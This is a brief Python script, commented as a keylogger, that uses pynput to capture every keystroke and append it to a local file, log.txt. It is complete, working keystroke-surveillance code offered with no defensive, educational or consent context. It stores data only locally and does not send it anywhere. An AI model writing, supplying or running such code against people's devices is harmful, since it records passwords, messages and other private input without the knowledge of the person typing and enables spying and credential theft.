from pynput.keyboard import Key, Listener

# Function to log keystrokes to a file
def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        with open("log.txt", "a") as log_file:
            if key == Key.space:
                log_file.write(' ')
            elif key == Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'{key}')

# Start the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
